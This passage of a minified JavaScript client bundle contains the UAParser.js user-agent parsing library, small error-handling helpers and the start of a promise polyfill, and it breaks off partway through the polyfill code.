/*! For license information please see client.min.js.LICENSE.txt */
(function () {
  const monitoredValues = window.monitoredValues;
  var __webpack_modules__ = {
      1284: function (n, t, e) {
        var i;
        !function (r, o) {
          "use strict";

          var a = "function",
            u = "undefined",
            c = "object",
            s = "string",
            f = "model",
            l = "name",
            d = "type",
            v = "vendor",
            h = "version",
            p = "architecture",
            g = "console",
            m = "mobile",
            _ = "tablet",
            w = "smarttv",
            y = "wearable",
            b = "embedded",
            E = "Amazon",
            I = "Apple",
            A = "ASUS",
            T = "BlackBerry",
            S = "Firefox",
            k = "Google",
            R = "Huawei",
            N = "LG",
            D = "Microsoft",
            C = "Motorola",
            O = "Opera",
            x = "Samsung",
            P = "Sharp",
            M = "Sony",
            L = "Xiaomi",
            V = "Zebra",
            F = "Facebook",
            U = function (n) {
              for (var t = {}, e = 0; e < n.length; e++) t[n[e].toUpperCase()] = n[e];
              return t;
            },
            z = function (n, t) {
              return typeof n === s && -1 !== j(t).indexOf(j(n));
            },
            j = function (n) {
              return n.toLowerCase();
            },
            G = function (n, t) {
              if (typeof n === s) return n = n.replace(/^\s\s*/, ""), typeof t === u ? n : n.substring(0, 350);
            },
            B = function (n, t) {
              for (var e, i, r, u, s, f, l = 0; l < t.length && !s;) {
                var d = t[l],
                  v = t[l + 1];
                for (e = i = 0; e < d.length && !s && d[e];) if (s = d[e++].exec(n)) for (r = 0; r < v.length; r++) f = s[++i], typeof (u = v[r]) === c && u.length > 0 ? 2 === u.length ? typeof u[1] == a ? this[u[0]] = u[1].call(this, f) : this[u[0]] = u[1] : 3 === u.length ? typeof u[1] !== a || u[1].exec && u[1].test ? this[u[0]] = f ? f.replace(u[1], u[2]) : o : this[u[0]] = f ? u[1].call(this, f, u[2]) : o : 4 === u.length && (this[u[0]] = f ? u[3].call(this, f.replace(u[1], u[2])) : o) : this[u] = f || o;
                l += 2;
              }
            },
            q = function (n, t) {
              for (var e in t) if (typeof t[e] === c && t[e].length > 0) {
                for (var i = 0; i < t[e].length; i++) if (z(t[e][i], n)) return "?" === e ? o : e;
              } else if (z(t[e], n)) return "?" === e ? o : e;
              return n;
            },
            H = {
              ME: "4.90",
              "NT 3.11": "NT3.51",
              "NT 4.0": "NT4.0",
              2e3: "NT 5.0",
              XP: ["NT 5.1", "NT 5.2"],
              Vista: "NT 6.0",
              7: "NT 6.1",
              8: "NT 6.2",
              8.1: "NT 6.3",
              10: ["NT 6.4", "NT 10.0"],
              RT: "ARM"
            },
            Y = {
              browser: [[/\b(?:crmo|crios)\/([\w\.]+)/i], [h, [l, "Chrome"]], [/edg(?:e|ios|a)?\/([\w\.]+)/i], [h, [l, "Edge"]], [/(opera mini)\/([-\w\.]+)/i, /(opera [mobiletab]{3,6})\b.+version\/([-\w\.]+)/i, /(opera)(?:.+version\/|[\/ ]+)([\w\.]+)/i], [l, h], [/opios[\/ ]+([\w\.]+)/i], [h, [l, "Opera Mini"]], [/\bopr\/([\w\.]+)/i], [h, [l, O]], [/(kindle)\/([\w\.]+)/i, /(lunascape|maxthon|netfront|jasmine|blazer)[\/ ]?([\w\.]*)/i, /(avant |iemobile|slim)(?:browser)?[\/ ]?([\w\.]*)/i, /(ba?idubrowser)[\/ ]?([\w\.]+)/i, /(?:ms|\()(ie) ([\w\.]+)/i, /(flock|rockmelt|midori|epiphany|silk|skyfire|ovibrowser|bolt|iron|vivaldi|iridium|phantomjs|bowser|quark|qupzilla|falkon|rekonq|puffin|brave|whale(?!.+naver)|qqbrowserlite|qq|duckduckgo)\/([-\w\.]+)/i, /(weibo)__([\d\.]+)/i], [l, h], [/(?:\buc? ?browser|(?:juc.+)ucweb)[\/ ]?([\w\.]+)/i], [h, [l, "UCBrowser"]], [/microm.+\bqbcore\/([\w\.]+)/i, /\bqbcore\/([\w\.]+).+microm/i], [h, [l, "WeChat(Win) Desktop"]], [/micromessenger\/([\w\.]+)/i], [h, [l, "WeChat"]], [/konqueror\/([\w\.]+)/i], [h, [l, "Konqueror"]], [/trident.+rv[: ]([\w\.]{1,9})\b.+like gecko/i], [h, [l, "IE"]], [/yabrowser\/([\w\.]+)/i], [h, [l, "Yandex"]], [/(avast|avg)\/([\w\.]+)/i], [[l, /(.+)/, "$1 Secure Browser"], h], [/\bfocus\/([\w\.]+)/i], [h, [l, "Firefox Focus"]], [/\bopt\/([\w\.]+)/i], [h, [l, "Opera Touch"]], [/coc_coc\w+\/([\w\.]+)/i], [h, [l, "Coc Coc"]], [/dolfin\/([\w\.]+)/i], [h, [l, "Dolphin"]], [/coast\/([\w\.]+)/i], [h, [l, "Opera Coast"]], [/miuibrowser\/([\w\.]+)/i], [h, [l, "MIUI Browser"]], [/fxios\/([-\w\.]+)/i], [h, [l, S]], [/\bqihu|(qi?ho?o?|360)browser/i], [[l, "360 Browser"]], [/(oculus|samsung|sailfish|huawei)browser\/([\w\.]+)/i], [[l, /(.+)/, "$1 Browser"], h], [/(comodo_dragon)\/([\w\.]+)/i], [[l, /_/g, " "], h], [/(electron)\/([\w\.]+) safari/i, /(tesla)(?: qtcarbrowser|\/(20\d\d\.[-\w\.]+))/i, /m?(qqbrowser|baiduboxapp|2345Explorer)[\/ ]?([\w\.]+)/i], [l, h], [/(metasr)[\/ ]?([\w\.]+)/i, /(lbbrowser)/i, /\[(linkedin)app\]/i], [l], [/((?:fban\/fbios|fb_iab\/fb4a)(?!.+fbav)|;fbav\/([\w\.]+);)/i], [[l, F], h], [/(kakao(?:talk|story))[\/ ]([\w\.]+)/i, /(naver)\(.*?(\d+\.[\w\.]+).*\)/i, /safari (line)\/([\w\.]+)/i, /\b(line)\/([\w\.]+)\/iab/i, /(chromium|instagram)[\/ ]([-\w\.]+)/i], [l, h], [/\bgsa\/([\w\.]+) .*safari\//i], [h, [l, "GSA"]], [/headlesschrome(?:\/([\w\.]+)| )/i], [h, [l, "Chrome Headless"]], [/ wv\).+(chrome)\/([\w\.]+)/i], [[l, "Chrome WebView"], h], [/droid.+ version\/([\w\.]+)\b.+(?:mobile safari|safari)/i], [h, [l, "Android Browser"]], [/(chrome|omniweb|arora|[tizenoka]{5} ?browser)\/v?([\w\.]+)/i], [l, h], [/version\/([\w\.\,]+) .*mobile\/\w+ (safari)/i], [h, [l, "Mobile Safari"]], [/version\/([\w(\.|\,)]+) .*(mobile ?safari|safari)/i], [h, l], [/webkit.+?(mobile ?safari|safari)(\/[\w\.]+)/i], [l, [h, q, {
                "1.0": "/8",
                1.2: "/1",
                1.3: "/3",
                "2.0": "/412",
                "2.0.2": "/416",
                "2.0.3": "/417",
                "2.0.4": "/419",
                "?": "/"
              }]], [/(webkit|khtml)\/([\w\.]+)/i], [l, h], [/(navigator|netscape\d?)\/([-\w\.]+)/i], [[l, "Netscape"], h], [/mobile vr; rv:([\w\.]+)\).+firefox/i], [h, [l, "Firefox Reality"]], [/ekiohf.+(flow)\/([\w\.]+)/i, /(swiftfox)/i, /(icedragon|iceweasel|camino|chimera|fennec|maemo browser|minimo|conkeror|klar)[\/ ]?([\w\.\+]+)/i, /(seamonkey|k-meleon|icecat|iceape|firebird|phoenix|palemoon|basilisk|waterfox)\/([-\w\.]+)$/i, /(firefox)\/([\w\.]+)/i, /(mozilla)\/([\w\.]+) .+rv\:.+gecko\/\d+/i, /(polaris|lynx|dillo|icab|doris|amaya|w3m|netsurf|sleipnir|obigo|mosaic|(?:go|ice|up)[\. ]?browser)[-\/ ]?v?([\w\.]+)/i, /(links) \(([\w\.]+)/i, /panasonic;(viera)/i], [l, h], [/(cobalt)\/([\w\.]+)/i], [l, [h, /master.|lts./, ""]]],
              cpu: [[/(?:(amd|x(?:(?:86|64)[-_])?|wow|win)64)[;\)]/i], [[p, "amd64"]], [/(ia32(?=;))/i], [[p, j]], [/((?:i[346]|x)86)[;\)]/i], [[p, "ia32"]], [/\b(aarch64|arm(v?8e?l?|_?64))\b/i], [[p, "arm64"]], [/\b(arm(?:v[67])?ht?n?[fl]p?)\b/i], [[p, "armhf"]], [/windows (ce|mobile); ppc;/i], [[p, "arm"]], [/((?:ppc|powerpc)(?:64)?)(?: mac|;|\))/i], [[p, /ower/, "", j]], [/(sun4\w)[;\)]/i], [[p, "sparc"]], [/((?:avr32|ia64(?=;))|68k(?=\))|\barm(?=v(?:[1-7]|[5-7]1)l?|;|eabi)|(?=atmel )avr|(?:irix|mips|sparc)(?:64)?\b|pa-risc)/i], [[p, j]]],
              device: [[/\b(sch-i[89]0\d|shw-m380s|sm-[ptx]\w{2,4}|gt-[pn]\d{2,4}|sgh-t8[56]9|nexus 10)/i], [f, [v, x], [d, _]], [/\b((?:s[cgp]h|gt|sm)-\w+|sc[g-]?[\d]+a?|galaxy nexus)/i, /samsung[- ]([-\w]+)/i, /sec-(sgh\w+)/i], [f, [v, x], [d, m]], [/\((ip(?:hone|od)[\w ]*);/i], [f, [v, I], [d, m]], [/\((ipad);[-\w\),; ]+apple/i, /applecoremedia\/[\w\.]+ \((ipad)/i, /\b(ipad)\d\d?,\d\d?[;\]].+ios/i], [f, [v, I], [d, _]], [/(macintosh);/i], [f, [v, I]], [/\b(sh-?[altvz]?\d\d[a-ekm]?)/i], [f, [v, P], [d, m]], [/\b((?:ag[rs][23]?|bah2?|sht?|btv)-a?[lw]\d{2})\b(?!.+d\/s)/i], [f, [v, R], [d, _]], [/(?:huawei|honor)([-\w ]+)[;\)]/i, /\b(nexus 6p|\w{2,4}e?-[atu]?[ln][\dx][012359c][adn]?)\b(?!.+d\/s)/i], [f, [v, R], [d, m]], [/\b(poco[\w ]+)(?: bui|\))/i, /\b; (\w+) build\/hm\1/i, /\b(hm[-_ ]?note?[_ ]?(?:\d\w)?) bui/i, /\b(redmi[\-_ ]?(?:note|k)?[\w_ ]+)(?: bui|\))/i, /\b(mi[-_ ]?(?:a\d|one|one[_ ]plus|note lte|max|cc)?[_ ]?(?:\d?\w?)[_ ]?(?:plus|se|lite)?)(?: bui|\))/i], [[f, /_/g, " "], [v, L], [d, m]], [/\b(mi[-_ ]?(?:pad)(?:[\w_ ]+))(?: bui|\))/i], [[f, /_/g, " "], [v, L], [d, _]], [/; (\w+) bui.+ oppo/i, /\b(cph[12]\d{3}|p(?:af|c[al]|d\w|e[ar])[mt]\d0|x9007|a101op)\b/i], [f, [v, "OPPO"], [d, m]], [/vivo (\w+)(?: bui|\))/i, /\b(v[12]\d{3}\w?[at])(?: bui|;)/i], [f, [v, "Vivo"], [d, m]], [/\b(rmx[12]\d{3})(?: bui|;|\))/i], [f, [v, "Realme"], [d, m]], [/\b(milestone|droid(?:[2-4x]| (?:bionic|x2|pro|razr))?:?( 4g)?)\b[\w ]+build\//i, /\bmot(?:orola)?[- ](\w*)/i, /((?:moto[\w\(\) ]+|xt\d{3,4}|nexus 6)(?= bui|\)))/i], [f, [v, C], [d, m]], [/\b(mz60\d|xoom[2 ]{0,2}) build\//i], [f, [v, C], [d, _]], [/((?=lg)?[vl]k\-?\d{3}) bui| 3\.[-\w; ]{10}lg?-([06cv9]{3,4})/i], [f, [v, N], [d, _]], [/(lm(?:-?f100[nv]?|-[\w\.]+)(?= bui|\))|nexus [45])/i, /\blg[-e;\/ ]+((?!browser|netcast|android tv)\w+)/i, /\blg-?([\d\w]+) bui/i], [f, [v, N], [d, m]], [/(ideatab[-\w ]+)/i, /lenovo ?(s[56]000[-\w]+|tab(?:[\w ]+)|yt[-\d\w]{6}|tb[-\d\w]{6})/i], [f, [v, "Lenovo"], [d, _]], [/(?:maemo|nokia).*(n900|lumia \d+)/i, /nokia[-_ ]?([-\w\.]*)/i], [[f, /_/g, " "], [v, "Nokia"], [d, m]], [/(pixel c)\b/i], [f, [v, k], [d, _]], [/droid.+; (pixel[\daxl ]{0,6})(?: bui|\))/i], [f, [v, k], [d, m]], [/droid.+ (a?\d[0-2]{2}so|[c-g]\d{4}|so[-gl]\w+|xq-a\w[4-7][12])(?= bui|\).+chrome\/(?![1-6]{0,1}\d\.))/i], [f, [v, M], [d, m]], [/sony tablet [ps]/i, /\b(?:sony)?sgp\w+(?: bui|\))/i], [[f, "Xperia Tablet"], [v, M], [d, _]], [/ (kb2005|in20[12]5|be20[12][59])\b/i, /(?:one)?(?:plus)? (a\d0\d\d)(?: b|\))/i], [f, [v, "OnePlus"], [d, m]], [/(alexa)webm/i, /(kf[a-z]{2}wi)( bui|\))/i, /(kf[a-z]+)( bui|\)).+silk\//i], [f, [v, E], [d, _]], [/((?:sd|kf)[0349hijorstuw]+)( bui|\)).+silk\//i], [[f, /(.+)/g, "Fire Phone $1"], [v, E], [d, m]], [/(playbook);[-\w\),; ]+(rim)/i], [f, v, [d, _]], [/\b((?:bb[a-f]|st[hv])100-\d)/i, /\(bb10; (\w+)/i], [f, [v, T], [d, m]], [/(?:\b|asus_)(transfo[prime ]{4,10} \w+|eeepc|slider \w+|nexus 7|padfone|p00[cj])/i], [f, [v, A], [d, _]], [/ (z[bes]6[027][012][km][ls]|zenfone \d\w?)\b/i], [f, [v, A], [d, m]], [/(nexus 9)/i], [f, [v, "HTC"], [d, _]], [/(htc)[-;_ ]{1,2}([\w ]+(?=\)| bui)|\w+)/i, /(zte)[- ]([\w ]+?)(?: bui|\/|\))/i, /(alcatel|geeksphone|nexian|panasonic(?!(?:;|\.))|sony(?!-bra))[-_ ]?([-\w]*)/i], [v, [f, /_/g, " "], [d, m]], [/droid.+; ([ab][1-7]-?[0178a]\d\d?)/i], [f, [v, "Acer"], [d, _]], [/droid.+; (m[1-5] note) bui/i, /\bmz-([-\w]{2,})/i], [f, [v, "Meizu"], [d, m]], [/(blackberry|benq|palm(?=\-)|sonyericsson|acer|asus|dell|meizu|motorola|polytron)[-_ ]?([-\w]*)/i, /(hp) ([\w ]+\w)/i, /(asus)-?(\w+)/i, /(microsoft); (lumia[\w ]+)/i, /(lenovo)[-_ ]?([-\w]+)/i, /(jolla)/i, /(oppo) ?([\w ]+) bui/i], [v, f, [d, m]], [/(kobo)\s(ereader|touch)/i, /(archos) (gamepad2?)/i, /(hp).+(touchpad(?!.+tablet)|tablet)/i, /(kindle)\/([\w\.]+)/i, /(nook)[\w ]+build\/(\w+)/i, /(dell) (strea[kpr\d ]*[\dko])/i, /(le[- ]+pan)[- ]+(\w{1,9}) bui/i, /(trinity)[- ]*(t\d{3}) bui/i, /(gigaset)[- ]+(q\w{1,9}) bui/i, /(vodafone) ([\w ]+)(?:\)| bui)/i], [v, f, [d, _]], [/(surface duo)/i], [f, [v, D], [d, _]], [/droid [\d\.]+; (fp\du?)(?: b|\))/i], [f, [v, "Fairphone"], [d, m]], [/(u304aa)/i], [f, [v, "AT&T"], [d, m]], [/\bsie-(\w*)/i], [f, [v, "Siemens"], [d, m]], [/\b(rct\w+) b/i], [f, [v, "RCA"], [d, _]], [/\b(venue[\d ]{2,7}) b/i], [f, [v, "Dell"], [d, _]], [/\b(q(?:mv|ta)\w+) b/i], [f, [v, "Verizon"], [d, _]], [/\b(?:barnes[& ]+noble |bn[rt])([\w\+ ]*) b/i], [f, [v, "Barnes & Noble"], [d, _]], [/\b(tm\d{3}\w+) b/i], [f, [v, "NuVision"], [d, _]], [/\b(k88) b/i], [f, [v, "ZTE"], [d, _]], [/\b(nx\d{3}j) b/i], [f, [v, "ZTE"], [d, m]], [/\b(gen\d{3}) b.+49h/i], [f, [v, "Swiss"], [d, m]], [/\b(zur\d{3}) b/i], [f, [v, "Swiss"], [d, _]], [/\b((zeki)?tb.*\b) b/i], [f, [v, "Zeki"], [d, _]], [/\b([yr]\d{2}) b/i, /\b(dragon[- ]+touch |dt)(\w{5}) b/i], [[v, "Dragon Touch"], f, [d, _]], [/\b(ns-?\w{0,9}) b/i], [f, [v, "Insignia"], [d, _]], [/\b((nxa|next)-?\w{0,9}) b/i], [f, [v, "NextBook"], [d, _]], [/\b(xtreme\_)?(v(1[045]|2[015]|[3469]0|7[05])) b/i], [[v, "Voice"], f, [d, m]], [/\b(lvtel\-)?(v1[12]) b/i], [[v, "LvTel"], f, [d, m]], [/\b(ph-1) /i], [f, [v, "Essential"], [d, m]], [/\b(v(100md|700na|7011|917g).*\b) b/i], [f, [v, "Envizen"], [d, _]], [/\b(trio[-\w\. ]+) b/i], [f, [v, "MachSpeed"], [d, _]], [/\btu_(1491) b/i], [f, [v, "Rotor"], [d, _]], [/(shield[\w ]+) b/i], [f, [v, "Nvidia"], [d, _]], [/(sprint) (\w+)/i], [v, f, [d, m]], [/(kin\.[onetw]{3})/i], [[f, /\./g, " "], [v, D], [d, m]], [/droid.+; (cc6666?|et5[16]|mc[239][23]x?|vc8[03]x?)\)/i], [f, [v, V], [d, _]], [/droid.+; (ec30|ps20|tc[2-8]\d[kx])\)/i], [f, [v, V], [d, m]], [/smart-tv.+(samsung)/i], [v, [d, w]], [/hbbtv.+maple;(\d+)/i], [[f, /^/, "SmartTV"], [v, x], [d, w]], [/(nux; netcast.+smarttv|lg (netcast\.tv-201\d|android tv))/i], [[v, N], [d, w]], [/(apple) ?tv/i], [v, [f, "Apple TV"], [d, w]], [/crkey/i], [[f, "Chromecast"], [v, k], [d, w]], [/droid.+aft(\w)( bui|\))/i], [f, [v, E], [d, w]], [/\(dtv[\);].+(aquos)/i, /(aquos-tv[\w ]+)\)/i], [f, [v, P], [d, w]], [/(bravia[\w ]+)( bui|\))/i], [f, [v, M], [d, w]], [/(mitv-\w{5}) bui/i], [f, [v, L], [d, w]], [/Hbbtv.*(technisat) (.*);/i], [v, f, [d, w]], [/\b(roku)[\dx]*[\)\/]((?:dvp-)?[\d\.]*)/i, /hbbtv\/\d+\.\d+\.\d+ +\([\w\+ ]*; *([\w\d][^;]*);([^;]*)/i], [[v, G], [f, G], [d, w]], [/\b(android tv|smart[- ]?tv|opera tv|tv; rv:)\b/i], [[d, w]], [/(ouya)/i, /(nintendo) ([wids3utch]+)/i], [v, f, [d, g]], [/droid.+; (shield) bui/i], [f, [v, "Nvidia"], [d, g]], [/(playstation [345portablevi]+)/i], [f, [v, M], [d, g]], [/\b(xbox(?: one)?(?!; xbox))[\); ]/i], [f, [v, D], [d, g]], [/((pebble))app/i], [v, f, [d, y]], [/droid.+; (glass) \d/i], [f, [v, k], [d, y]], [/droid.+; (wt63?0{2,3})\)/i], [f, [v, V], [d, y]], [/(quest( 2| pro)?)/i], [f, [v, F], [d, y]], [/(tesla)(?: qtcarbrowser|\/[-\w\.]+)/i], [v, [d, b]], [/droid .+?; ([^;]+?)(?: bui|\) applew).+? mobile safari/i], [f, [d, m]], [/droid .+?; ([^;]+?)(?: bui|\) applew).+?(?! mobile) safari/i], [f, [d, _]], [/\b((tablet|tab)[;\/]|focus\/\d(?!.+mobile))/i], [[d, _]], [/(phone|mobile(?:[;\/]| [ \w\/\.]*safari)|pda(?=.+windows ce))/i], [[d, m]], [/(android[-\w\. ]{0,9});.+buil/i], [f, [v, "Generic"]]],
              engine: [[/windows.+ edge\/([\w\.]+)/i], [h, [l, "EdgeHTML"]], [/webkit\/537\.36.+chrome\/(?!27)([\w\.]+)/i], [h, [l, "Blink"]], [/(presto)\/([\w\.]+)/i, /(webkit|trident|netfront|netsurf|amaya|lynx|w3m|goanna)\/([\w\.]+)/i, /ekioh(flow)\/([\w\.]+)/i, /(khtml|tasman|links)[\/ ]\(?([\w\.]+)/i, /(icab)[\/ ]([23]\.[\d\.]+)/i], [l, h], [/rv\:([\w\.]{1,9})\b.+(gecko)/i], [h, l]],
              os: [[/microsoft (windows) (vista|xp)/i], [l, h], [/(windows) nt 6\.2; (arm)/i, /(windows (?:phone(?: os)?|mobile))[\/ ]?([\d\.\w ]*)/i, /(windows)[\/ ]?([ntce\d\. ]+\w)(?!.+xbox)/i], [l, [h, q, H]], [/(win(?=3|9|n)|win 9x )([nt\d\.]+)/i], [[l, "Windows"], [h, q, H]], [/ip[honead]{2,4}\b(?:.*os ([\w]+) like mac|; opera)/i, /cfnetwork\/.+darwin/i], [[h, /_/g, "."], [l, "iOS"]], [/(mac os x) ?([\w\. ]*)/i, /(macintosh|mac_powerpc\b)(?!.+haiku)/i], [[l, "Mac OS"], [h, /_/g, "."]], [/droid ([\w\.]+)\b.+(android[- ]x86|harmonyos)/i], [h, l], [/(android|webos|qnx|bada|rim tablet os|maemo|meego|sailfish)[-\/ ]?([\w\.]*)/i, /(blackberry)\w*\/([\w\.]*)/i, /(tizen|kaios)[\/ ]([\w\.]+)/i, /\((series40);/i], [l, h], [/\(bb(10);/i], [h, [l, T]], [/(?:symbian ?os|symbos|s60(?=;)|series60)[-\/ ]?([\w\.]*)/i], [h, [l, "Symbian"]], [/mozilla\/[\d\.]+ \((?:mobile|tablet|tv|mobile; [\w ]+); rv:.+ gecko\/([\w\.]+)/i], [h, [l, "Firefox OS"]], [/web0s;.+rt(tv)/i, /\b(?:hp)?wos(?:browser)?\/([\w\.]+)/i], [h, [l, "webOS"]], [/crkey\/([\d\.]+)/i], [h, [l, "Chromecast"]], [/(cros) [\w]+(?:\)| ([\w\.]+)\b)/i], [[l, "Chromium OS"], h], [/panasonic;(viera)/i, /(netrange)mmh/i, /(nettv)\/(\d+\.[\w\.]+)/i, /(nintendo|playstation) ([wids345portablevuch]+)/i, /(xbox); +xbox ([^\);]+)/i, /\b(joli|palm)\b ?(?:os)?\/?([\w\.]*)/i, /(mint)[\/\(\) ]?(\w*)/i, /(mageia|vectorlinux)[; ]/i, /([kxln]?ubuntu|debian|suse|opensuse|gentoo|arch(?= linux)|slackware|fedora|mandriva|centos|pclinuxos|red ?hat|zenwalk|linpus|raspbian|plan 9|minix|risc os|contiki|deepin|manjaro|elementary os|sabayon|linspire)(?: gnu\/linux)?(?: enterprise)?(?:[- ]linux)?(?:-gnu)?[-\/ ]?(?!chrom|package)([-\w\.]*)/i, /(hurd|linux) ?([\w\.]*)/i, /(gnu) ?([\w\.]*)/i, /\b([-frentopcghs]{0,5}bsd|dragonfly)[\/ ]?(?!amd|[ix346]{1,2}86)([\w\.]*)/i, /(haiku) (\w+)/i], [l, h], [/(sunos) ?([\w\.\d]*)/i], [[l, "Solaris"], h], [/((?:open)?solaris)[-\/ ]?([\w\.]*)/i, /(aix) ((\d)(?=\.|\)| )[\w\.])*/i, /\b(beos|os\/2|amigaos|morphos|openvms|fuchsia|hp-ux)/i, /(unix) ?([\w\.]*)/i], [l, h]]
            },
            K = function (n, t) {
              if (typeof n === c && (t = n, n = o), !(this instanceof K)) return new K(n, t).getResult();
              var e = n || (typeof r !== u && r.navigator && r.navigator.userAgent ? r.navigator.userAgent : ""),
                i = typeof r !== u && r.navigator && r.navigator.userAgentData ? r.navigator.userAgentData : o,
                a = t ? function (n, t) {
                  var e = {};
                  for (var i in n) t[i] && t[i].length % 2 == 0 ? e[i] = t[i].concat(n[i]) : e[i] = n[i];
                  return e;
                }(Y, t) : Y;
              return this.getBrowser = function () {
                var n,
                  t = {};
                return t.name = o, t.version = o, B.call(t, e, a.browser), t.major = typeof (n = t.version) === s ? n.replace(/[^\d\.]/g, "").split(".")[0] : o, t;
              }, this.getCPU = function () {
                var n = {};
                return n.architecture = o, B.call(n, e, a.cpu), n;
              }, this.getDevice = function () {
                var n = {};
                return n.vendor = o, n.model = o, n.type = o, B.call(n, e, a.device), !n.type && i && i.mobile && (n.type = m), n;
              }, this.getEngine = function () {
                var n = {};
                return n.name = o, n.version = o, B.call(n, e, a.engine), n;
              }, this.getOS = function () {
                var n = {};
                return n.name = o, n.version = o, B.call(n, e, a.os), !n.name && i && "Unknown" != i.platform && (n.name = i.platform.replace(/chrome/i, "Chromium").replace(/mac/i, "Mac ")), n;
              }, this.getResult = function () {
                return {
                  ua: this.getUA(),
                  browser: this.getBrowser(),
                  engine: this.getEngine(),
                  os: this.getOS(),
                  device: this.getDevice(),
                  cpu: this.getCPU()
                };
              }, this.getUA = function () {
                return e;
              }, this.setUA = function (n) {
                return e = typeof n === s && n.length > 350 ? G(n, 350) : n, this;
              }, this.setUA(e), this;
            };
          K.VERSION = "0.7.33", K.BROWSER = U([l, h, "major"]), K.CPU = U([p]), K.DEVICE = U([f, v, d, g, m, w, _, y, b]), K.ENGINE = K.OS = U([l, h]), typeof t !== u ? (n.exports && (t = n.exports = K), t.UAParser = K) : e.amdO ? (i = function () {
            return K;
          }.call(t, e, t, n)) === o || (n.exports = i) : typeof r !== u && (r.UAParser = K);
        }("object" == typeof window ? window : this);
      },
      3491: function (n, t, e) {
        var i = e(2047)(),
          r = e(6417);
        n.exports = function (n, t) {
          function e(t) {
            if (!(this instanceof e)) return new e(t);
            try {
              throw new Error(t);
            } catch (o) {
              o.name = n, this.stack = o.stack;
            }
            i && this.stack && (this.stack = r(this.stack, n, t)), this.message = t || "", this.name = n;
          }
          return e.prototype = new (t || Error)(), e.prototype.constructor = e, e.prototype.inspect = function () {
            return this.message ? "[" + n + ": " + this.message + "]" : "[" + n + "]";
          }, e.prototype.name = n, e;
        };
      },
      6417: function (n) {
        "use strict";

        n.exports = function (n, t, e) {
          var i = t;
          return e && (i += ": " + e), n = i + n.slice(n.indexOf("\n"));
        };
      },
      2047: function (n) {
        "use strict";

        n.exports = function () {
          var n = new Error("yep");
          return !!n.stack && "Error: yep\n" === n.stack.substr(0, 11);
        };
      },
      44: function (n, t, e) {
        n.exports = function () {
          "use strict";

          function n(n) {
            return "function" == typeof n || "object" == typeof n && null !== n;
          }
          function t(n) {
            return "function" == typeof n;
          }
          undefined;
          var i = Array.isArray ? Array.isArray : function (n) {
              return "[object Array]" === Object.prototype.toString.call(n);
            },
            r = 0,
            o = undefined,
            a = undefined,
            u = function (n, t) {
              y[r] = n, y[r + 1] = t, 2 === (r += 2) && (a ? a(b) : I());
            };
          function c(n) {
            a = n;
          }
          function s(n) {
            u = n;
          }
          var f = "undefined" != typeof window ? window : undefined,
            l = f || {},
            d = l.MutationObserver || l.WebKitMutationObserver,
            v = "undefined" == typeof self && "undefined" != typeof process && "[object process]" === {}.toString.call(process),
            h = "undefined" != typeof Uint8ClampedArray && "undefined" != typeof importScripts && "undefined" != typeof MessageChannel;
          function p() {
            return function () {
              return process.nextTick(b);
            };
          }
          function g() {
            return void 0 !== o ? function () {
              o(b);
            } : w();
          }
          function m() {
            var n = 0,
              t = new d(b),
              e = document.createTextNode("");
            return t.observe(e, {
              characterData: !0
            }), function () {
              e.data = n = ++n % 2;
            };
          }
          function _() {
            var n = new MessageChannel();
            return n.port1.onmessage = b, function () {
              return n.port2.postMessage(0);
            };
          }
          function w() {
            var n = setTimeout;
            return function () {
              return n(b, 1);
            };
          }
          var y = new Array(1e3);
          function b() {
            for (var n = 0; n < r; n += 2) (0, y[n])(y[n + 1]), y[n] = undefined, y[n + 1] = undefined;
            r = 0;
          }
          function E() {
            try {
              undefined;
              var n = e(7339);
              return o = n.runOnLoop || n.runOnContext, g();
            } catch (t) {
              return w();
            }
          }
          var I = undefined;
          function A(n, t) {
            var e = arguments,
              i = this,
              r = new this.constructor(k);
            r[S] === undefined && Q(r);
            var o,
              a = i._state;
            return a ? (o = e[a - 1], u(function () {
              return $(a, r, o, i._result);
            })) : B(i, r, n, t), r;
          }
          function T(n) {
            var t = this;
            if (n && "object" == typeof n && n.constructor === t) return n;
            var e = new t(k);
            return U(e, n), e;
          }
          I = v ? p() : d ? m() : h ? _() : f === undefined ? E() : w();
          var S = Math.random().toString(36).substring(16);
          function k() {}
          var R = void 0,
            N = 1,
            D = 2,
            C = new H();
          function O() {
            return new TypeError("You cannot resolve a promise with itself");
          }
          function x() {
            return new TypeError("A promises callback cannot return that same promise.");
          }
          function P(n) {
            try {
              return n.then;
            } catch (t) {
              return C.error = t, C;
            }
          }
          function M(n, t, e, i) {
            try {
              n.call(t, e, i);
            } catch (r) {
              return r;
            }
          }
          function L(n, t, e) {
            u(function (n) {
              var i = !1,
                r = M(e, t, function (e) {
                  i || (i = !0, t !== e ? U(n, e) : j(n, e));
                }, function (t) {
                  i || (i = !0, G(n, t));
                }, "Settle: " + (n._label || " unknown promise"));
              !i && r && (i = !0, G(n, r));
            }, n);
          }
          function V(n, t) {
            t._state === N ? j(n, t._result) : t._state === D ? G(n, t._result) : B(t, undefined, function (t) {
              return U(n, t);
            }, function (t) {
              return G(n, t);
            });
          }
          function F(n, e, i) {
            e.constructor === n.constructor && i === A && e.constructor.resolve === T ? V(n, e) : i === C ? (G(n, C.error), C.error = null) : i === undefined ? j(n, e) : t(i) ? L(n, e, i) : j(n, e);
          }
          function U(t, e) {
            t === e ? G(t, O()) : n(e) ? F(t, e, P(e)) : j(t, e);
          }
          function z(n) {
            n._onerror && n._onerror(n._result), q(n);
          }
          function j(n, t) {
            n._state === R && (n._result = t, n._state = N, 0 !== n._subscribers.length && u(q, n));
          }
          function G(n, t) {
            n._state === R && (n._state = D, n._result = t, u(z, n));
          }
          function B(n, t, e, i) {
            var r = n._subscribers,
              o = r.length;
            n._onerror = null, r[o] = t, r[o + N] = e, r[o + D] = i, 0 === o && n._state && u(q, n);
          }
          function q(n) {
            var t = n._subscribers,
              e = n._state;
            if (0 !== t.length) {
              for (var i = undefined, r = undefined, o = n._result, a = 0; a < t.length; a += 3) i = t[a], r = t[a + e], i ? $(e, i, r, o) : r(o);
              n._subscribers.length = 0;
            }
          }
          function H() {
            this.error = null;
          }
          var Y = new H();
          function K(n, t) {
            try {
              return n(t);
            } catch (e) {
              return Y.error = e, Y;
            }
          }
          function $(n, e, i, r) {
            var o = t(i),
              a = undefined,
              u = undefined,
              c = undefined,
              s = undefined;
            if (o) {
              if ((a = K(i, r)) === Y ? (s = !0, u = a.error, a.error = null) : c = !0, e === a) return void G(e, x());
            } else a = r, c = !0;
            e._state !== R || (o && c ? U(e, a) : s ? G(e, u) : n === N ? j(e, a) : n === D && G(e, a));
          }
          function W(n, t) {
            try {
              t(function (t) {
                U(n, t);
              }, function (t) {
